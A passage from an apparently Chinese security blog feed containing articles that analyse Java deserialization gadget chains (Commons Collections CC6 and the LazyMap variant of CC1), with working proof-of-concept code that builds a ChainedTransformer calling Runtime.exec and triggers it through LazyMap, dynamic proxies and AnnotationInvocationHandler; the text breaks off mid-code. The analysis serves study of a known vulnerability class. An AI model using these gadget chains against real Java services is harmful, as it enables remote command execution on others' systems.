class="string">&quot;k&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回一个包含hashMap中所有键的Set视图</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(hashMap.keySet());</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 利用反射技术，传入真正恶意的evilTransformers</span></span><br><span class="line">        f.set(emptyTransformers, evilTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移除传入lazyMap中的Key，使LazyMap#get方法中的(map.containsKey(key) == false)判断为true</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;k&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----------------本地序列化与反序列化测试----------------</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC6WithHashSet.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashSet);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;CC6WithHashSet.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc6/2.png"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li><a href="https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html">https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html</a></li><li><a href="https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html">https://0xf4n9x.github.io/java-deserialization-cc1-transformedmap.html</a></li><li><a href="https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html">https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html</a></li><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞之LazyMap版CC1链</title>
      <link href="/java-deserialization-cc1-lazymap.html"/>
      <url>/java-deserialization-cc1-lazymap.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-LazyMap%E7%9A%84%E7%94%B1%E6%9D%A5">0x00 LazyMap的由来</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">0x02 动态代理</a></li><li><a href="#0x03-LayzMap-get">0x03 LayzMap#get</a></li><li><a href="#0x04-AnnotationInvocationHandler-invoke">0x04 AnnotationInvocationHandler#invoke</a></li><li><a href="#0x05-%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81">0x05 概念验证</a></li><li><a href="#0x06-Debug%E5%AF%BC%E8%87%B4%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98">0x06 Debug导致的小问题</a></li><li><a href="#0x07-%E5%8F%82%E8%80%83">0x07 参考</a></li></ul><h2 id="0x00-LazyMap的由来"><a href="#0x00-LazyMap的由来" class="headerlink" title="0x00 LazyMap的由来"></a>0x00 LazyMap的由来</h2><p>在上一篇<a href="./java-deserialization-cc1-transformedmap">《Java反序列化漏洞之TransformedMap版CC1链》</a>文章中，提到了2015年1月加州AppSec安全会议上，Chris Frohoff和Gabe Lawrence在演讲中就CommonsCollections1完整调用链做出了演示，其中所用到的中间Gadget链就是<code>LazyMap</code>类，在随后发布的Ysoserial工具中所包含的CommonsCollections1链也同样如此。</p><p>那么，本文将会详细分析<code>LazyMap</code>作为中间链的这种反序列化利用方式。当然，与<code>TransformedMap</code>作为中间Gadget链相比，kick-off入口类与sink危害类都是相同的类，所以涉及重复的内容不会再赘述。不过，虽然sink类相同，但其中执行的方法却有所不同。</p><p>在此之前还需要了解一些前置知识，比如Java动态代理机制，当对LazyMap作为中间链的反序列化利用方式分析透彻了，对于后面学习其他Gadget链也是有帮助的，比如CommonsCollections3、CommonsCollections5、CommonsCollections6、CommonsCollections7都有涉及到<code>LazyMap</code>类。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>与上一篇文章中提到的影响范围相同，都是影响JDK 8u71以下的版本，且Commons Collections的版本要求在3.0以上、3.2.2以下。</p><h2 id="0x02-动态代理"><a href="#0x02-动态代理" class="headerlink" title="0x02 动态代理"></a>0x02 动态代理</h2><p>Java中的动态代理是一种在运行时创建代理对象的机制，该代理对象能够拦截对目标对象方法的调用并在调用前后执行额外的逻辑，动态代理通常用于在不修改原始代码的情况下实现日志记录、性能监控、事务管理等功能。</p><p>动态代理主要使用<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口来实现，<code>Proxy</code>类用于创建代理对象，而<code>InvocationHandler</code>接口则负责处理代理对象方法的调用。如下示例代码，非常清晰地演示了不使用动态代理与使用动态代理之间的差异性，一言以蔽之，被动态代理的对象每执行一个方法，都会调用对应的实现<code>InvocationHandler</code>接口类的<code>invoke</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvocationHandlerDemo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvocationHandlerDemo</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;invoke is called.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.obj, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">      </span><br><span class="line">        map.put(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        <span class="comment">// 正常通过键获取值的方式</span></span><br><span class="line">        System.out.println(<span class="string">&quot;k: &quot;</span> + map.get(<span class="string">&quot;k&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过代理的方式</span></span><br><span class="line">        <span class="comment">// 首先先创建InvocationHandler实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandlerDemo</span>(map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再创建代理实例对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                invocationHandler</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 最后通过代理对象执行相关操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;k&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;k: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 执行结果：</span></span><br><span class="line"><span class="comment">k: v</span></span><br><span class="line"><span class="comment">--------------------------</span></span><br><span class="line"><span class="comment">invoke is called.</span></span><br><span class="line"><span class="comment">k: v</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="0x03-LayzMap-get"><a href="#0x03-LayzMap-get" class="headerlink" title="0x03 LayzMap#get"></a>0x03 LayzMap#get</h2><p><code>org.apache.commons.collections.map.LazyMap</code>是一个继承自AbstractMapDecorator并用于创建懒加载的装饰类，它实现了<code>Map</code>和<code>Serializable</code>，其中的<code>decorate</code>方法用于创建一个装饰后的<code>Map</code>实例，该方法接受一个被装饰的<code>Map</code>对象，以及一个工厂对象，后者将作为Lazymap的<code>factory</code>成员变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果key当前不在map中，则为key创建value</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>LayzMap#get</code>方法中，先会对传入的key进行判断是否存在于<code>map</code>中，此处的<code>map</code>是父类<code>AbstractMapDecorator</code>中的成员变量，且用到了<code>transient</code>修饰符，意味着它不会参与序列化，也意味着在反序列化过程中<code>map</code>会为空，其中不会包含任何key，这样就会顺利进入到if代码块中，而在其中有对<code>factory</code>的<code>transform</code>方法进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The map to decorate */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Map map;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，当通过<code>LazyMap.decorate</code>方法传入一个恶意的<code>ChainedTransformer</code>对象作为恶意的<code>factory</code>，然后再调用<code>LayzMap#get</code>方法，最终就会触发恶意行为。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), tc);</span><br><span class="line"></span><br><span class="line">        lazyMap.get(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-lazymap/containskey.png"></p><p><img src="/img/post/java-deserialization-cc1-lazymap/0.png"></p><h2 id="0x04-AnnotationInvocationHandler-invoke"><a href="#0x04-AnnotationInvocationHandler-invoke" class="headerlink" title="0x04 AnnotationInvocationHandler#invoke"></a>0x04 AnnotationInvocationHandler#invoke</h2><p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>，这恰恰让人联系到上面的动态代理机制，而且这个类中的<code>invoke</code>方法里存在<code>memberValues.get</code>方法的调用，这又能够关联到<code>LayzMap#get</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但不过，重写的<code>readObject</code>方法中并未涉及到<code>invoke</code>相关方法，所以就需要用到动态代理机制，从而执行到<code>invoke</code>方法，最终达到执行<code>get</code>方法以达到命令的执行。</p><h2 id="0x05-概念验证"><a href="#0x05-概念验证" class="headerlink" title="0x05 概念验证"></a>0x05 概念验证</h2><p>结合如上所有，最终构造如下POC。第一处创建的<code>AnnotationInvocationHandler</code>实例是用于利用<code>invoke</code>方法触发<code>LazyMap</code>中的get方法从而达到命令执行，接着会通过调用<code>Proxy.newProxyInstance()</code>方法为这个实例创建代理对象proxyMap，但由于在反序列化的入口是<code>readObject</code>方法，所以无法对proxyMap直接序列化，所以就需要二次创建<code>AnnotationInvocationHandler</code>实例来对proxyMap进行包装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span 